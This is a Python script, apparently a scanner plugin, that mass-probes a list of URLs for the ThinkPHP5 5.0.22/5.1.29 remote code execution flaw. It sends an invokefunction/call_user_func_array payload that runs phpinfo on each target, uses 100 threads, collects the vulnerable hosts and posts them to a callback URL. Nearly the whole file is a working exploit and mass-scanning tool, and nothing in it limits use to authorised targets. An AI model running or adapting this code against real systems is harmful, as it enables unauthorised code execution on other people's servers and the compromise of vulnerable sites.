#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
import sys
import nmap
import argparse
import json
import time
from urllib.parse import urlparse
from multiprocessing.dummy import Pool as ThreadPool
urllib3.disable_warnings()

vul_info = []

def ThinkPHP5(url):
    global vul_info
    pocdict = {
        "vulnname":" ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
        "vul_level":"2",#高危
        "vul_type":"4",#代码执行
        "vul_exp_script":"Thinkphp5 5.0.22/5.1.29 Remote Code Execution_exp.py"
    }
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36",
    }

    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1')
        print(vurl)
        req = requests.get(vurl,headers=headers, timeout=15, verify=False)
        if 'PHP License' in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            #pocdict['response'] = req.text
            print(pocdict)
            url_info=urlparse(vurl)
            vul_host = url_info.netloc
            vul_info.append({"vul_name":pocdict["vulnname"],"vul_level":pocdict["vul_level"],"vul_type":pocdict["vul_type"],"vul_url":vurl,"vul_host":vul_host})

    except Exception as e:
        print(e)
  
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest='url', help="返回接口")
    parser.add_argument("-uid", "--uuid", dest='uuid', help="用户id")
    parser.add_argument("-sid", "--scanid", dest='scanid', help="任务id")

    args = parser.parse_args()
    
    pool = ThreadPool(100)
    url_list = []
    with open('url.txt',errors='ignore',encoding="utf-8") as f:
        lines = f.readlines()
        for url in lines:
            url = url.replace("\n","")
            url_list.append(url)
    pool.map( ThinkPHP5,url_list)    
    pool.close()  #关闭线程池，执行close后不会有新线程加入
    pool.join()   #等待所有子线程结束掉，后再结束。
    
    info_list = {"uuid":args.uuid,"scanid":args.scanid,"vul_info":vul_info}
    print(info_list)
    rep = requests.post(url=args.url,json=info_list)
    print(rep.text)
